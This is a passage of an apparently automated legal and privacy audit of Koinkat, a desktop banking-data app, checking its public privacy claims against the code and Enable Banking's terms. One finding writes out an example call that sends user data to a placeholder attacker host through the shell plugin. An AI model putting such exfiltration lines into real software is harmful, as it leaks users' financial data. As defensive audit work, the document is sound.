# Koinkat legal exposure review

Date of review: 2026-08-26
Amended: 2026-08-27 - see [Corrections](#corrections-2026-08-27)
Reviewed commit: `787b4ca` (branch `main`, clean tree)
Reviewed by: automated audit, unreviewed by a lawyer

## What this document is, and is not

This is an **evidence base**, not a clearance. Nothing here is legal advice,
and the author of this document is not a lawyer. Its purpose is to let a
qualified lawyer spend one hour instead of ten by separating three things
that are routinely conflated:

1. **What the code does** - verifiable, and verified here against
   `file:line` anchors.
2. **What a document claims** - verifiable, and verified here.
3. **What the law or a contract requires** - *not* verifiable here. Every
   such statement below is either a short quote from a primary source with
   its URL, or is explicitly tagged `UNVERIFIED` / `NEEDS-HUMAN-CHECK`.

No statement in this document should be read as concluding that the project
is compliant, safe, or protected. Where the evidence is good, the evidence
is stated; where it is absent, its absence is stated.

Open items are collected separately in
[`legal-open-questions.md`](legal-open-questions.md), with the working notes
behind the 2026-08-27 pass in
[`legal-open-questions-answered-2026-08-27.md`](legal-open-questions-answered-2026-08-27.md).

### Method and coverage limits

- Code claims: verified by direct reading of the working tree at the commit
  above, plus the compiled bundle in `dist/` and the Rust crate sources in
  the local cargo registry cache.
- Contractual claims: verified by fetching Enable Banking's public pages on
  2026-08-26. No login was used and no credentials were entered.
- Dependency licences: **no SBOM tooling was used.** `syft`, `grant`,
  `grype`, `license-checker`, `cargo-license` and `cargo-deny` are not
  installed on the review machine and nothing was installed for this pass.
  Licence data was read directly from package metadata. **No vulnerability
  (CVE) scan was run at all.** See [Task 3](#task-3---licence-and-dependency-hygiene)
  for the precise coverage gap.

---

## Executive summary of findings

| Severity | Finding |
|---|---|
| **Correct a claim** | The README's "a bug or a compromised dependency could not quietly phone home" is **overstated**. It is true of the webview; it is not true of the 617-crate Rust dependency tree. |
| **Correct a claim** | "The complete list of outbound connections" omits browser launches and the embedded OS webview's own traffic. |
| **Add a disclosure** | The bank authorization code transits the query string of a GitHub Pages URL. The page logs nothing; GitHub does, for its own security purposes, and exposes nothing to the site owner. Currently undisclosed. |
| **Fix a gap** | `CONTRIBUTING.md` has **no inbound licence clause**, and there are open PRs. |
| **Fix a gap** | **No third-party licence notice ships** with the app or the repo, although OFL-1.1 fonts are compiled into the binary. |
| **Fix a gap** | `src-tauri/Cargo.toml` has no `license`, `authors`, `description` or `repository` field. |
| **Fix a bug** | Bank disconnect swallows a failed session revocation silently. |
| **Stale file** | `docs/callback/index.html` does not match the deployed callback page. |
| **Dated** | Cyber Resilience Act reporting obligations begin **11 September 2026**. The FOSS non-commercial carve-out appears to cover this project today. A plain donation link does **not** forfeit it - CRA Recital 15; donor-only builds or paid tiers would. |
| **Good news** | The Google Fonts concern that prompted this review **does not apply** - fonts are already self-hosted. |
| **Good news** | Enable Banking's public terms **expressly support** the deployment pattern and the in-app description of it. |
| **Good news** | No GPL-incompatible dependency, no committed secret, no telemetry, no updater. |

---

## Task 1 - Verification of public claims against the code

Verdicts: `TRUE` (claim matches the code), `OVERSTATED` (directionally right,
materially too strong), `FALSE`, `UNVERIFIABLE` (cannot be established from
this repository - typically a claim about a third party).

### 1.1 The Google Fonts question - not applicable

This review was commissioned partly to plan a migration away from Google
Fonts, on the premise that the app loads `fonts.googleapis.com` at launch.
**That premise is incorrect.** Verified four independent ways:

1. Fonts are npm packages, not remote links: `@fontsource/dm-sans`,
   `@fontsource/dm-serif-display`, `@fontsource/jetbrains-mono`
   (`package.json:28-30`).
2. They are imported as local CSS at `src/main.tsx:6-14`.
3. The CSP forbids remote font hosts outright: `font-src 'self' data:`
   (`src-tauri/tauri.conf.json:24`).
4. The compiled bundle contains the font binaries locally
   (`dist/assets/dm-sans-latin-400-normal-*.woff2` and 20 further files).
   Grepping every compiled asset for external hosts returns no
   `googleapis` or `gstatic` reference.

Consequently the README statement "Typefaces are bundled with the app, so no
font host is contacted" (`README.md:1007-1008`) is **TRUE**, and the exposure
associated with *LG München I, 3 O 17493/20* (20 January 2022) - the ruling
that a website transmitting a visitor's IP to Google Fonts infringed the
plaintiff's personality right, which triggered a wave of German warning
letters - **does not arise here**. No migration plan is needed; the work is
already done.

`UNVERIFIED`: the characterisation of the LG München I judgment above is from
general knowledge and was not verified against the judgment text in this
review. It is included only to explain why the concern was raised, and
nothing in this document depends on it.

### 1.2 Claim table

| # | Claim (quoted) | Where stated | Verified how (file:line) | Verdict |
|---|---|---|---|---|
| 1 | "All data stays on your device - no cloud, no telemetry, no accounts system" | `README.md:5-7` | The app's own outbound table 45 lines later shows bank data transiting Enable Banking. The headline overstates the body. | OVERSTATED |
| 2 | "no Koinkat server, no account with us, no sign-up, no telemetry, and no analytics" | `README.md:51-53` | No server code in repo; no analytics SDK in `package.json` or `package-lock.json`; no updater anywhere | TRUE |
| 3 | "Nobody involved in this project can see your data" | `README.md:53` | Structurally true - no server, no telemetry sink, no credential the project holds. But phrased as a promise about people's conduct rather than a fact about architecture | TRUE (restate structurally) |
| 4 | "the **complete** list of outbound connections the app makes, verified from the source code" | `README.md:56-58` | Omits three paths - see [1.3](#13-the-outbound-connection-inventory) | OVERSTATED |
| 5 | FX CDN receives nothing about you, "not even your chosen currency" | `README.md:64` | `src/lib/fx-fetch.ts:76-81` - the URL is always `.../currency-api@<date>/v1/currencies/usd.json`; the base currency is hardcoded USD and conversion happens locally | TRUE (with a footnote - see [1.4](#14-a-residual-signal-in-the-fx-requests)) |
| 6 | Online-banking credentials are entered "on your bank's own website, never in Koinkat" | `README.md:62` | No credential input field exists anywhere in `src/`; authorization is a browser handoff at `src/pages/BankLink.tsx:248` | TRUE |
| 7 | The callback page "makes zero further network requests and hands the code back to the app locally" | `README.md:66` | Deployed page source fetched 2026-08-26: no external scripts, styles, fonts or images; no `fetch`/XHR/`sendBeacon`; no storage. It sets `window.location` to a `koinkat://auth-callback` deep link, with manual copy as fallback | TRUE **of the page**; silent about the host - see [1.5](#15-the-callback-page-and-the-github-pages-edge-log) |
| 8 | The code "is useless without the private key that exists only on your machine" | `README.md:66` | EB requires an RS256-signed JWT; the key is held in the OS credential store (`src-tauri/src/secrets.rs`) and is never transmitted | TRUE |
| 9 | "no update pings, no crash reporting, no tracking" | `README.md:69-71` | See [1.6](#16-proving-the-telemetry-negative) | TRUE |
| 10 | "The app's content-security policy blocks requests to any other host, so a bug or a compromised dependency could not quietly phone home" | `README.md:71-73` | See [1.7](#17-the-phone-home-claim-in-detail) | **OVERSTATED** |
| 11 | Database paths under `com.koinkat.app` | `README.md:78-81` | `identifier` is `com.koinkat.app` (`src-tauri/tauri.conf.json:5`); paths are Tauri's standard app-config directory | TRUE |
| 12 | Private key in the OS credential store, "Not in the database", falling back to the database "and says so in Settings" | `README.md:82` | `src-tauri/src/secrets.rs:12` fixes the service name to `koinkat`; the fallback notice is rendered at `src/pages/Settings.tsx:899-907` | TRUE |
| 13 | "The database is not encrypted at rest" | `README.md:84` | `tauri-plugin-sql` with the `sqlite` feature; no SQLCipher in `Cargo.lock` | TRUE |
| 14 | CSP "allows data connections only to `api.enablebanking.com` and the exchange-rate CDN" | `README.md:1004-1007` | `src-tauri/tauri.conf.json:24` - `connect-src` lists exactly those hosts plus `ipc:` | TRUE (as a statement about the CSP specifically) |
| 15 | "Typefaces are bundled with the app, so no font host is contacted" | `README.md:1007-1008` | See [1.1](#11-the-google-fonts-question---not-applicable) | TRUE |
| 16 | "There is no telemetry endpoint to allow" | `README.md:1010` | As #9 | TRUE |
| 17 | The callback "validates a cryptographically random state; missing or mismatching states are rejected" | `README.md:1011-1013` | `crypto.randomUUID()` at `src/services/enable-banking-service-real.ts:230`; rejection is unconditional and an absent state is rejected too, `src/pages/BankLink.tsx:329-337` | TRUE |
| 18 | "the JSON export deliberately excludes API credentials" | `README.md:1000-1001` | `src/services/export-service.ts:29-31` excludes `api_configs` with the PEM as the stated reason | TRUE |
| 19 | "Release binaries are built without the webview devtools feature" | `README.md:1014` | `src-tauri/Cargo.toml` - `tauri = { version = "2", features = [] }`, with a comment stating the intent | TRUE |
| 20 | "Koinkat connects to exactly two services" / "There are no other outbound connections" | `docs/privacy-policy.md:38,64` | Same omissions as #4 | OVERSTATED |
| 21 | "The app cannot initiate payments or transfers" | `docs/privacy-policy.md:45-46` | `src/services/enable-banking-service-real.ts:240-244` requests only `balances: true, transactions: true`; no payment-initiation endpoint exists anywhere in `src/`. Whether the word "cannot" holds depends on EB/ASPSP enforcement, not on Koinkat | TRUE in code; enforcement addressed in [Task 2 Q3](#q3-scope---is-it-really-read-only) |
| 22 | Consents "expire on their own after just under 180 days" | `docs/privacy-policy.md:83-84` | `CONSENT_VALID_DAYS = 179` (`src/lib/constants.ts:24`), used at `enable-banking-service-real.ts:226` | TRUE |
| 23 | Credential entries under service `koinkat`, named `eb-pem-<workspace-id>` | `docs/privacy-policy.md:27-29,80-81` | `src-tauri/src/secrets.rs:12`; `src/services/api-config-service.ts:37` | TRUE |
| 24 | "What the developer receives ... Nothing" | `docs/privacy-policy.md:66-68` | No inbound channel of any kind exists | TRUE |
| 25 | Disconnecting a bank revokes the Enable Banking session | implied by README + privacy policy | `src/services/bank-sync-service.ts:1372-1376` calls `deleteSession`, but inside `try { } catch { }` that discards the error and unlinks locally regardless. The user is never told revocation failed | OVERSTATED - see [Task 2 Q6](#q6-revocation) |
| 26 | The private key "is created locally and never transmitted; only the public half is registered" | `src/components/BankSetupGuide.tsx:196` | A claim about Enable Banking's Control Panel, not about Koinkat's code. Now corroborated from EB's docs - see [Task 2 Q2](#q2-does-ebs-agreement-permit-this-deployment-pattern) | TRUE (via EB docs) |
| 27 | "Enable Banking never has your private key, so it cannot re-send it" | `src/components/BankSetupGuide.tsx:202` | Same. EB's docs corroborate the first half; the "cannot re-send" consequence follows from it but is not separately stated by EB | TRUE (first half sourced; consequence is inference) |
| 28 | "only the bank accounts you link in the Control Panel will ever be visible to Koinkat" | `src/components/BankSetupGuide.tsx:253-255` | Corroborated by EB's docs on restricted applications - see [Task 2 Q2](#q2-does-ebs-agreement-permit-this-deployment-pattern) | TRUE (via EB docs) |
| 29 | "Restricted mode covers your own personal accounts only: not business accounts, not anyone else's, and no commercial use" | `src/components/BankSetupGuide.tsx:272-275` | This restates a third party's contract terms to users. **It tracks EB's Terms of Service closely and accurately** - see [Task 2 Q2](#q2-does-ebs-agreement-permit-this-deployment-pattern) | TRUE (via EB terms) |
| 30 | The callback page's "only job is to bounce the authorization code back into Koinkat via the `koinkat://auth-callback` deep link" | `src/components/BankSetupGuide.tsx:167-169` | TRUE of the **deployed** page (fetched and read 2026-08-26). The copy committed at `docs/callback/index.html` has neither the deep link nor the `state` parameter - it is stale | TRUE, but see [1.8](#18-the-stale-callback-copy-in-this-repo) |

### 1.3 The outbound-connection inventory

The README table lists three connections. Enumerating every path the app can
cause traffic on:

**Present and correctly described:**

| Path | Evidence |
|---|---|
| `api.enablebanking.com` | `src/services/enable-banking-service-real.ts:6,117,130,144` via `@tauri-apps/plugin-http` |
| `cdn.jsdelivr.net`, `*.currency-api.pages.dev` | `src/lib/fx-fetch.ts:47,54,76-81` - two transports, plugin-http then webview `fetch` |
| Bank authorization page, then the callback page | `src/pages/BankLink.tsx:248` via `@tauri-apps/plugin-shell` `open()` |

**Omitted from the table:**

| Omitted path | Evidence | Materiality |
|---|---|---|
| `enablebanking.com/cp/applications` opened in the user's browser | `src/pages/BankLink.tsx:593` | Low - user-initiated, and it is where the setup guide sends them anyway. But EB's own site runs Google Analytics (see [Task 2 Q4](#q4-data-flow-and-retention)), so the user is tracked there |
| `github.com/MarcoSburlino/Koinkat/issues/new` | `src/components/ErrorBoundary.tsx:126` | Low - user-initiated link, only reachable after a crash |
| The embedded OS webview's own traffic (WebView2 on Windows, WKWebView on macOS, WebKitGTK on Linux) | `Cargo.lock` - `webview2-com`, `wry`, `tao`, `objc2-web-kit`, `webkit2gtk` | Moderate - these components can contact their vendors for certificate revocation, SmartScreen and similar. Koinkat does not control this and cannot enumerate it |

The word "complete" is the problem, not the list. Three additions and one
softened adjective fix it.

### 1.4 A residual signal in the FX requests

The claim that the FX request contains nothing about the user is true of any
single request. Across requests there is a weak signal: `fetchRates(date)`
(`src/lib/fx-fetch.ts:72-81`) requests historical tables by date, so the
**set of dates requested** correlates with the date range of the user's
transactions. jsDelivr sees a date list and an IP, never an amount, a
currency or an account. This is a footnote, not a defect, but the current
wording ("Anything about you") is absolute and this is the one thing that
qualifies it.

### 1.5 The callback page and the GitHub Pages edge log

The claim about the page is accurate and was verified against the deployed
source. What is missing is a statement about the **host**.

The authorization code arrives as a query parameter:
`https://marcosburlino.github.io/koinkat-callback/?code=<code>&state=<state>`.
GitHub Pages serves this through a CDN, and GitHub's own documentation
states that on a visit "the visitor's IP address is logged and stored for
security purposes"
(<https://docs.github.com/en/pages/getting-started-with-github-pages/what-is-github-pages>).
The page storing nothing does not prevent the host from recording the
request that carried the code.

**But the logging is GitHub's, for GitHub's purposes, and the maintainer has
no access to it.** GitHub provides Pages site owners with no access logs, no
request analytics and no server-side statistics: repository traffic insights
cover repository activity, not requests to the published site, and there are
standing community feature requests asking GitHub to expose exactly this.
So the maintainer neither holds nor can obtain a record of authorization
codes. An earlier draft of this review implied the opposite; that was wrong,
and it was wrong in the direction of overstating the project's exposure.

Three facts limit the residual risk, and all three are verifiable:

1. **Nobody on this project can read those logs**, per the paragraph above.
2. **The code is single-use and short-lived.** It is exchanged immediately
   for a session at `POST /sessions`
   (`src/services/enable-banking-service-real.ts:279`).
3. **The code is worthless alone.** Exchanging it requires a request signed
   with the user's own RS256 private key, which exists only in their OS
   credential store (`src-tauri/src/secrets.rs`) and was never transmitted
   to anyone.

`NEEDS-HUMAN-CHECK`: GitHub's retention period for this request data was not
established here, and only GitHub Support can answer it. It does not move the
analysis much: what matters for the controllership question is that the
maintainer has no access and determines no purpose - see
[Task 2 Q5](#q5-the-koinkat-projects-gdpr-role).

### 1.6 Proving the telemetry negative

What was searched, and what was found:

| Searched for | Where | Result |
|---|---|---|
| `tauri-plugin-updater`, `self_update` | `src-tauri/Cargo.toml`, `src-tauri/Cargo.lock` | Absent |
| `updater`, `createUpdaterArtifacts` keys | `tauri.conf.json`, `tauri.conf.demo.json` | Absent - the app has no update mechanism at all |
| `sentry`, `posthog`, `mixpanel`, `segment`, `amplitude`, `analytics`, `bugsnag`, `rollbar`, `datadog`, `telemetry`, `google-analytics`, `gtag`, `matomo`, `plausible`, `firebase`, `crashlytics` | `package.json`, `package-lock.json` | Absent |
| External hosts in the compiled bundle | `dist/assets/*.js`, `*.css`, `index.html` | Only `github.com`, `marcosburlino.github.io`, `cdn.jsdelivr.net`, `latest.currency-api.pages.dev`, `enablebanking.com`, `api.enablebanking.com`. The remainder (`w3.org`, `react.dev`, `reactrouter.com`, `fb.me`) are XML namespaces and library error-message URLs, never fetched |

**One apparent counterexample, resolved:** `@opentelemetry/api` appears at
`package-lock.json:3615`. It is an **optional peer dependency of `vitest`**,
which is a devDependency. It is not present in `node_modules`, is not
installed, and never reaches a build. It is not telemetry in this project.

The error reporter is local-only: `ErrorBoundary` renders the report to the
screen and offers a clipboard copy (`src/components/ErrorBoundary.tsx:116-119`).
Nothing is transmitted.

### 1.7 The "phone home" claim in detail

The claim conflates a webview policy with a process-wide guarantee. There are
three layers, and the README describes one of them, omits a second that helps
its case, and overlooks a third that defeats it.

**Layer 1 - the webview's own requests. Constrained, as claimed.**
CSP `connect-src` (`src-tauri/tauri.conf.json:24`) permits only
`api.enablebanking.com`, `cdn.jsdelivr.net` and `*.currency-api.pages.dev`.
A malicious npm package calling `fetch()` to any other host is blocked.

**Layer 2 - the Rust HTTP client, when called from the webview. Also
constrained - and the README does not mention this.**
`src-tauri/capabilities/default.json:14-20` scopes `http:allow-fetch` to the
same three hosts. Note that the plugin's own `http:default` permission set
grants fetch **"without any pre-configured scope"** (per the generated ACL
manifest at `src-tauri/gen/schemas/acl-manifests.json`); the explicit scoped
entry is what supplies the allowlist. This is a genuine second control and
it is worth stating publicly, not omitting.

**Layer 3 - Rust code itself. Entirely unconstrained.**
`Cargo.lock` contains **617 crates**, among them `reqwest`, `hyper`, `h2`,
`tokio`, `rustls` and `socket2` - a complete asynchronous network stack
compiled into the binary. The CSP is a policy the webview enforces on
content it loads. The capability ACL gates IPC commands invoked *from* the
webview. **Neither mechanism constrains Rust code running in-process.** A
compromised Cargo dependency can open a socket directly, and nothing in this
architecture would stop or notice it.

**Two further channels that bypass the CSP:**

1. **`shell.open` accepts any https host.** `shell:default` and
   `shell:allow-open` are granted (`src-tauri/capabilities/default.json:37-38`)
   and `tauri.conf.json` sets no `plugins.shell.open` configuration, so the
   plugin applies its built-in default. Read from the crate source on the
   review machine, `tauri-plugin-shell-2.3.5/src/lib.rs:154`, the default
   validation regex is:

   ```
   ^((mailto:\w+)|(tel:\w+)|(https?://\w+)).+
   ```

   Any `https://host/path` satisfies it. Compromised frontend code could
   call `open("https://attacker.example/?d=<data>")` and the OS would launch
   the user's browser. This is **not silent** - a browser window appears -
   but it is not blocked, and "quietly" is doing a lot of work in the
   current sentence.

2. **The CSP sets no `form-action`**, which does not inherit from
   `default-src`, and CSP does not restrict top-level navigation in any
   case. Both are narrower channels than `connect-src`, but neither is
   "blocked".

**Proposed replacement**, which is both more accurate and more flattering
than the current text:

> Two independent controls keep the app's own traffic to the hosts listed
> above: the webview's content-security policy, and the Tauri capability
> allowlist, which scopes the Rust HTTP client to the same three hosts.
> Neither control applies to the Rust dependency tree itself - as in any
> native application, a compromised crate could open a socket directly.
> That is the trust you extend to the dependency set of any desktop app you
> run; `Cargo.lock` and `package-lock.json` are in the repository so the
> set can be audited.

### 1.8 The stale callback copy in this repo

`docs/callback/index.html` is **not** what is deployed at
`marcosburlino.github.io/koinkat-callback/`. The deployed page (fetched
2026-08-26 from the `koinkat-callback` repository) reads a `state` parameter,
sets `window.location.href` to `koinkat://auth-callback?code=...&state=...`,
and offers an "Open Koinkat" button alongside the copy button. The committed
copy does none of these.

This matters for two reasons beyond tidiness. First, the in-app guide
(`src/components/BankSetupGuide.tsx:167-169`) describes the deployed
behaviour, so a reader comparing the guide against this repo finds a
contradiction. Second, and more importantly for an audit: **a reviewer
reading this repository to verify the callback claim would verify the wrong
file.** Either replace it with the deployed source or delete it and link to
the canonical repository.

---

## Task 2 - The Enable Banking chain of authority

*This section is written to be read standalone, without the rest of the
document.*

### Summary

Koinkat is a desktop application that reads a user's own bank account data.
It holds no credentials, operates no server, and is not a party to any
agreement with Enable Banking. Each user registers their **own** application
with Enable Banking, accepts Enable Banking's terms **directly**, generates a
private key that Enable Banking never receives, and grants consent on their
**own bank's** website. Koinkat's role is limited to shipping software that
knows how to speak the protocol.

Enable Banking's publicly available Terms of Service, last updated 9 January
2026 (<https://enablebanking.com/terms/>), expressly contemplate exactly this
usage model. They do **not** expressly address whether a third party may
*distribute* software that instructs users to set it up. That silence is the
principal open question and is recorded as such.

### The authority chain, step by step

```
                    ┌──────────────────────────────────────────┐
                    │  Marco Sburlino / the Koinkat project    │
                    │  Ships GPL-3.0 software. No server.      │
                    │  No credentials. No data received.       │
                    │  NOT a party to legs 1, 2 or 3.          │
                    └────────────────┬─────────────────────────┘
                                     │  leg 4: GPL-3.0-or-later
                                     │  (software licence only,
                                     │   no service, no warranty)
                                     ▼
   ┌────────────────────────────────────────────────────────────────┐
   │                          THE USER                              │
   │  Simultaneously: Control Panel user AND End User (PSU)         │
   └───┬──────────────────────┬─────────────────────────┬───────────┘
       │ leg 1                │ leg 2                   │ leg 3
       │ Registers own EB     │ Consents as End User    │ Grants PSD2
       │ Application;         │ to EB's End User Terms  │ consent via SCA
       │ accepts EB ToS       │                         │ on the bank's
       ▼                      ▼                         ▼  own website
   ┌───────────────────┐  ┌───────────────────┐  ┌──────────────────┐
   │ Enable Banking Oy │  │ Enable Banking Oy │  │  The user's bank │
   │ (Control Panel +  │  │ (as authorised    │  │     (ASPSP)      │
   │  API provider)    │  │  AISP)            │  │                  │
   └───────────────────┘  └─────────┬─────────┘  └────────┬─────────┘
                                    │                     │
                                    │ ◄───────────────────┘
                                    │  EB is the regulated AISP that
                                    │  calls the bank on the user's behalf
                                    ▼
                          Account + transaction data
                          flows through EB to the app,
                          and is written only to the
                          user's local SQLite database.
```

Numbered walkthrough:

1. **User to Enable Banking (Control Panel).** The user registers an account
   at `enablebanking.com/cp` and registers an Application. The Terms of
   Service state they apply to use of the Control Panel and API, and that
   by using them "you agree to these Terms"
   (<https://enablebanking.com/terms/>). The counterparty is Enable Banking
   Oy, business ID 2988499-7, Espoo, Finland. **Koinkat is not mentioned and
   is not a party.**

2. **User to Enable Banking (as End User).** The Terms explicitly separate
   this leg: they "do not govern your use of the API as an End User"
   (<https://enablebanking.com/terms/>), directing End Users to separate
   terms at <https://tilisy.enablebanking.com/terms> (last updated 8 March
   2024). In Koinkat's model the same person occupies both roles, so the
   user accepts both instruments.

3. **User to bank (ASPSP).** PSD2 consent is given through the bank's own
   Strong Customer Authentication and consent flow. Enable Banking states
   that to share data "an End User must complete the ASPSP's SCA and consent
   flows" (<https://enablebanking.com/terms/>). Koinkat never sees the
   credentials; verified in code - there is no credential input anywhere,
   and authorization is a browser handoff (`src/pages/BankLink.tsx:248`).

4. **User to Koinkat.** GPL-3.0-or-later. A software licence only. No
   service is provided, no account exists, and no data is received.

**Is the Koinkat project a party to the Enable Banking relationship at all?**
On the evidence: **no**. The terms bind "you", the Control Panel user. The
software ships no application ID and no key - both are entered by the user
(`src/services/api-config-service.ts`), and the private key is held in the
user's own OS credential store (`src-tauri/src/secrets.rs`). There is no
Koinkat-operated intermediary at any point in the chain.

### Q1: Who contracts with whom?

Confirmed as set out above. Each leg verified: leg 1 and 2 against EB's terms
pages; leg 3 against EB's terms and Koinkat's code; leg 4 against `LICENSE`
and `package.json`.

One consequence worth surfacing to users, because it is currently
undisclosed: Enable Banking's liability toward the user is capped, in their
words, at **"EUR 100"** (<https://enablebanking.com/terms/>), while the terms
state that no limitation of liability applies to the *user* in respect of any
breach by them. That asymmetry is EB's to set, but a user being pointed at
EB's signup by Koinkat's documentation may reasonably want to know.

### Q2: Does EB's agreement permit this deployment pattern?

This is the question with the most consequential answer, and the public terms
address it more directly than expected.

**What the terms permit.** Production use is, in EB's words, "limited to
Linked Accounts" and available "solely for evaluation purposes or for the
personal use of private individuals" (<https://enablebanking.com/terms/>).
That is precisely Koinkat's model: a private individual, linking their own
accounts, for personal use.

**What the terms forbid.** The Restriction of Use section states the terms
grant no right to use the API "for any business or professional purpose",
enumerating three prohibitions: accessing account information "belonging to
businesses"; accessing information that does not belong to "the Control Panel
user who associated the Linked Accounts"; and "using the API for any
commercial purpose whatsoever"
(all <https://enablebanking.com/terms/>).

**This validates claim #29.** The in-app guide tells users that restricted
mode covers "your own personal accounts only: not business accounts, not
anyone else's, and no commercial use"
(`src/components/BankSetupGuide.tsx:272-275`). Each of those three limbs maps
onto one of EB's three enumerated prohibitions, and the "personal accounts
only" framing matches "the personal use of private individuals". The
statement is accurate and is not overstated. This was the highest-risk claim
identified in Task 1 and it survives verification.

**Claims #26, #27 and #28 are also corroborated**, from EB's Control Panel
documentation (<https://enablebanking.com/docs/api/control-panel/>), which
describes the browser-generated private key as "saved directly to your local
machine and not transmitted", with only the public key registered; and from
the linked-accounts documentation
(<https://enablebanking.com/docs/api/linked-accounts/>), which states that
with restricted applications "you can only fetch data from accounts linked to
the application". The guide's description of full activation - manual review,
contract, KYC - matches EB's description of unrestricted mode requiring
"manual review by our personnel" including verification of a contract and
"Know-Your-Customer" process (<https://enablebanking.com/docs/api/control-panel/>).
The guide's caution that EB "may cap how many one application can link" is
matched by EB's "The number of Linked Accounts per Application may be
limited." (<https://enablebanking.com/terms/>).

**The unanswered part - distribution.** The terms contain a
non-transfer clause: the user shall not "license, sublicense, sell, resell,
market, lease, loan, rent, transfer, assign, distribute, disclose, or make
accessible to any third party" the Control Panel or the API
(<https://enablebanking.com/terms/>).

Read naturally, that clause binds **the Control Panel user** and concerns
**the Control Panel and the API** - not a developer's own software that
happens to call the API. Koinkat grants nobody access to the API: Enable
Banking does that, directly, when each user registers. Koinkat ships no
credentials, which is verifiable in the source.

But the terms are **silent** on whether a third party may distribute
software that instructs users to register their own application. The FAQ is
silent too (<https://enablebanking.com/docs/faq/>). **Silence is not
permission**, and it is recorded here as silence. This is open question 3.

A second clause deserves a glance: users shall not use the API "to build any
software, product, or service that is competitive or similar to them"
(<https://enablebanking.com/terms/>). A personal finance manager is not
plausibly similar to a bank-aggregation API or a developer control panel, so
the risk appears low - but the assessment is not a lawyer's.

### Q3: Scope - is it really read-only?

**From the code, yes.** The authorization request sets only
`balances: true` and `transactions: true`, with `psu_type: 'personal'`
(`src/services/enable-banking-service-real.ts:236-245`). Searching all of
`src/` for payment-initiation surfaces returns nothing: the only matches for
"payment" are comments about normalising payment-wrapper prefixes in merchant
names (`src/services/bank-sync-service.ts:312`,
`src/services/categorization-service.ts:484`). The API surface the client
implements is `/aspsps`, `/auth`, `/sessions`, `/accounts/{}/balances`,
`/accounts/{}/transactions` and `DELETE /sessions/{}` - all read paths plus
session lifecycle.

**Where enforcement sits.** Enable Banking states its API relies on it
"acting as an authorised AISP", pointing to the EBA register entry
(<https://enablebanking.com/terms/>). An AISP authorisation covers account
information services only; payment initiation is a separate PSD2 permission.
So the constraint is not merely Koinkat declining to ask - Enable Banking's
own regulatory permission for this API is AIS.

`NEEDS-HUMAN-CHECK`: whether scope is additionally enforced per-consent at
the ASPSP, which would make a third independent control. Not established
here. This does not affect the conclusion that Koinkat requests read-only
scope, which is verified in code.

### Q4: Data flow and retention

**What Enable Banking receives.** Account, balance and transaction data from
the ASPSP, relayed to the application.

**What it retains.** Enable Banking's End User terms state that account data
"flows through Enable Banking API and won't be registered there", while the
service "registers your PSU authentication tokens and consent ID"
(<https://tilisy.enablebanking.com/terms>). The FAQ is more explicit: the API
"does not store the account information it processes"
(<https://enablebanking.com/docs/faq/>). So: tokens and consent identifiers
are retained; account data is transited.

**Control Panel data is separate and retained indefinitely.** The Privacy
Notice (last updated 17 March 2025) covers the website and Control Panel. It
lists email, phone, first and last name, and organisation name, and states
plainly: "Personal data is retained indefinitely."
(<https://enablebanking.com/privacy/>).

**Sub-processors.** The same notice discloses Google Cloud EMEA, AWS EMEA,
Netlify, HubSpot, Squarespace, Algolia, Google LLC and Twilio/SendGrid, with
processing locations in the EEA and, for several, the USA. Notably it
discloses that **Google Analytics** is used on the website "including the
Enable Banking Control Panel" (<https://enablebanking.com/privacy/>).

This last point has a direct bearing on Koinkat's documentation: the app
sends users to `enablebanking.com/cp/applications`
(`src/pages/BankLink.tsx:593`) and the setup guide walks them through the
Control Panel. Those users are subject to Google Analytics on EB's property.
Koinkat's privacy policy correctly points to EB's privacy notice, but the
README's framing of a world in which only three hosts are ever contacted sits
awkwardly beside it.

**Controller and processor in the user-EB relationship.** `UNVERIFIED`.
Neither EB document reviewed here uses the words "controller" or "processor"
to characterise the account-data leg. The End User terms say EB "processes
personal data only for the purpose and to the extent that Enable Banking API
service can function for you" (<https://tilisy.enablebanking.com/terms>),
which is suggestive but is not a designation. As a regulated AISP with its
own PSD2 obligations, EB would ordinarily be expected to act as a controller
for at least some purposes, but **this review does not establish that** and
the question is carried forward as open question 4.

### Q5: The Koinkat project's GDPR role

**The argument that the project is neither controller nor processor.**
Article 4(7) GDPR defines a controller by reference to determining the
purposes and means of processing; Article 4(8) defines a processor as one
processing personal data on the controller's behalf. `UNVERIFIED` - these
characterisations of Articles 4(7) and 4(8) are from general knowledge and
were not verified against the Regulation text in this review.

On the facts, which *are* verified:

- The project operates no server and receives no personal data. There is no
  inbound channel - no telemetry, no crash reporting, no updater, no account
  system (Task 1, #2 and #9).
- Data is written only to the user's own device
  (`src-tauri/tauri.conf.json` `sql` plugin preload; paths per Task 1, #11).
- The user alone decides which accounts to link and what to do with the data.
- The project holds no credential that could access anyone's data.

Software that runs entirely on a user's device, transmits nothing to its
author, and is configured entirely by the user looks much more like a tool
than like a participant in processing.

**Now attacking the argument.** Facts that could weaken it:

1. **The callback page.** This is the strongest counter-argument, and it is
   the reason the maintainer was right to ask. The default redirect URL
   points at `marcosburlino.github.io/koinkat-callback/` - infrastructure
   **registered by the maintainer**, on a host that logs request URLs
   including the query string that carries the authorization code. The page
   itself provably does nothing with the code. The question is whether
   *nominating* a host that logs a token, and being the account holder for
   that host, amounts to determining a means of processing.

   Points against exposure: **the maintainer does not receive the log and
   has no means of obtaining it** - GitHub exposes no request logs to Pages
   site owners at all (see [1.5](#15-the-callback-page-and-the-github-pages-edge-log)),
   so this is not a case of holding data and declining to look at it. The
   code is also single-use, short-lived, and cryptographically useless
   without a private key the maintainer never has; and the redirect field is
   user-editable, so self-hosters can avoid the shared page entirely
   (`DEFAULT_CALLBACK_URL` in `src/lib/constants.ts`, with the alternative
   documented in `src/components/BankSetupGuide.tsx`).

   Points for exposure: the *default* was chosen by the maintainer, and
   defaults are what almost everyone uses. Note also what is actually in the
   log line - an opaque code next to an IP address, and it is the IP that is
   the personal data. GitHub logs that IP on every request to every Pages
   site regardless of content, so stripping the code out of the picture, the
   residual fact is "the host I chose logs visitors' IPs", which is true of
   every website there has ever been.

   **This is still a real question and it is not resolved here**, because
   nominating the default is a choice the maintainer made. It is open
   question 1, and it remains the item in this review most deserving of a
   lawyer's thirty minutes - though a narrower one than it first appeared.

2. **Documentation as instruction.** Koinkat tells users how to configure a
   third-party service and what that service's terms permit. If the guidance
   were wrong, the exposure would be misrepresentation rather than GDPR
   controllership - and Task 1 found the guidance accurate. Still, the more
   prescriptive the instructions, the closer the project sits to
   "determining means".

3. **A future LLM categorization stage.** Not implemented today - the code
   contains only a placeholder comment
   (`src/services/categorization-service.ts:178-182`). If it ever routes
